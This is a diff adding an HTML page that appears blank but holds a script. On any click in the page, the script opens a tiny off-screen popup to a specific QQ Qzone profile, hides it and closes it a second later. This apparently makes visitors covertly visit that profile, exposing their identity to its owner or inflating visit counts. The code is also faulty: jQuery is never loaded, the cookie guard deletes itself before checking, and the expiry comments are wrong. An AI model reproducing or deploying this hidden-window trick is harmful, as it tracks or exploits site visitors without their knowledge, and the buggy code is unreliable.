@@ -1,0 +1,61 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML>
+<HEAD>
+<TITLE> New Document </TITLE>
+<META NAME="Generator" CONTENT="EditPlus">
+<META NAME="Author" CONTENT="">
+<META NAME="Keywords" CONTENT="">
+<META NAME="Description" CONTENT=""> 
+</HEAD>
+<script>
+$(function(){
+	$("body").click(function(){ 
+		openQQqzone()
+	})
+})
+//写cookies   Days=3000  为三秒   86400=一天
+function setCookie(name,value,Days) { 
+	if(Days==undefined){
+		Days=24*60*60*100*30			//为30天
+	}
+	var exp = new Date(); 
+	exp.setTime(exp.getTime() + Days); 
+	document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString(); 
+} 
+//读取cookies 
+function getCookie(name) { 
+	var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)"); 
+	if(arr=document.cookie.match(reg)) return unescape(arr[2]); 
+	else return null; 
+} 
+//删除cookies   javascript:alert(document.cookie ="postnum=;expires=" + (new Date(0)).toGMTString())
+function delCookie(name) { 
+	var exp = new Date(); 
+	exp.setTime(exp.getTime() - 1); 
+	var cval=getCookie(name); 
+	if(cval!=null) document.cookie= name + "="+cval+";expires="+exp.toGMTString(); 
+}
+var QQqzoneWindow
+//打开QQ空格
+function openQQqzone(){
+	delCookie("myqqqzone")
+	if(getCookie("myqqqzone")!="qq"){
+		setCookie("myqqqzone","qq",86400)	
+		QQqzoneWindow=window.open('http://user.qzone.qq.com/313801120', 'newwindow', 'height=1, width=1, top=9999, left=9999, toolbar=no, menubar=no, scrollbars=no, resizable=no,location=no, status=no')
+		//QQqzoneWindow=window.location.href='http://user.qzone.qq.com/313801120'
+		try{
+		 	 QQqzoneWindow.blur();	 
+			 QQqzoneWindow.resizeTo(0,0);   //window.resizeTo(0,0)设置大小
+			 QQqzoneWindow.moveTo(9999,9999);   
+		 }catch(exception){
+		 
+		 }	 
+		 this.focus();
+		 setTimeout("QQqzoneWindow.close()",1000);
+	 }
+} 
+</script>
+<BODY> 
+</BODY>
+</HTML>
+ 
